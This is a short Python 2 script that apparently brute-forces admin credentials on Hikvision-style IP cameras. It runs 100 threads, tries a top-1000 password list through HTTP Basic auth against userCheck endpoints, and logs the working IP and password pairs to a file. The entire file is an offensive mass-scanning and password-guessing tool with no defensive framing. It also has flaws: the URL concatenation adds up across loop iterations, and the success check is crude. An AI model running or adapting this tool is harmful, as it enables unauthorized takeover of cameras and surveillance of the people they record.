import base64
import requests
from threading import *

urls = ( '/PSIA/Custom/SelfExt/userCheck', '/ISAPI/Security/userCheck', '/PSIA/Custom/HIK/userCheck')

fp = open('1.txt','r')
fp1 = open('ip.txt','w')

def getusers():
    users = []
    fp2 = open('password-top1000.txt', 'r')
    ip = fp2.readlines()
    for user in ip:
        users.append('admin:' + user.strip('\n'))
    fp2.close()
    return users

def scan(ip):
    #print ip
    ip = ip.strip('\n')
    site = "http://" + ip
    for url in urls:
        site = site + url
        users = getusers()
        for user in users:
            user_pass = 'Basic ' + base64.b64encode(user)
            headers = {'Authorization': user_pass}
            try:
                r = requests.get(site, headers=headers, timeout=5)
                if '200' in str(r):
                    if '200' in r.text:
                        fp1.write(ip + ' ' + user + '\n')
                        print ip, user
                        break
                else:
                    break
            except:
                return 0

def main():
    sites = fp.readlines()
    threads = 100
    for ip in sites:
        while(True):
            if activeCount() <= threads:
                Thread(target=scan,args=(ip,)).start()
                break
            else:
                continue
    while(True):
        if activeCount() < 2:
            return 1

if __name__ == '__main__':
    main()
